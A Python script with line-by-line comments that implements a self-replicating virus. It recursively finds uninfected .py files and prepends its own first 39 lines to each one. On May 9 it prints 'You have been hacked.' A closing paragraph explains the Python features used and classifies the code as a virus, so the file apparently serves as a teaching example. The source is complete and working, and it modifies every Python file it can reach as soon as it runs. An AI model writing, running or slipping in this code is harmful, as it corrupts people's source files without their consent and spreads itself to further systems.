#!/usr/bin/python3
# This line is a shebang line that tells the system this script should be run with Python 3.

import os
import datetime
# These lines import necessary modules: os for interacting with the operating system, and datetime for date and time functions.

SIGNATURE = "VIRUS"
# This sets a constant called SIGNATURE with the string "VIRUS", used to mark infected files.

def locate(path):
    # This function searches for Python files in the given directory that are not yet infected.
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            # If the item is a directory, it recursively searches within this directory.
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            # Checks if the file ends with '.py', indicating a Python file.
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    # Checks if the file is already infected.
                    infected = True
                    break
            if infected == False:
                # Adds non-infected Python files to the list.
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    # This function infects the targeted files by prepending them with the virus code.
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            # Copies the first 39 lines of the current file (the virus code).
            virusstring += line
    virus.close()
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        # Writes the virus code followed by the original file content.
        f.write(virusstring + temp)
        f.close()

def detonate():
    # This function is the payload of the virus which triggers under specific conditions.
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # Checks if the current date is May 9.
        print("You have been hacked")
        # If so, it prints a message indicating the system is hacked.

files_targeted = locate(os.path.abspath(""))
# Calls the locate function from the script's directory to find target files.
infect(files_targeted)
# Calls the infect function to infect the found files.
detonate()
# Calls the detonate function which checks the date and may print a message. Core Python/coding tools used: Functions (locate, infect, detonate) for organizing code into reusable blocks. The os module for interacting with the file system. The datetime module for getting the current date. Control structures like if statements and for loops for decision making and iteration. File handling (opening, reading, writing, closing files). Type of Malware: This script is a type of malware known as a virus. A virus is a malicious code that, once executed, replicates by modifying other computer programs and inserting its own code. In this case, it targets Python files and inserts itself into them.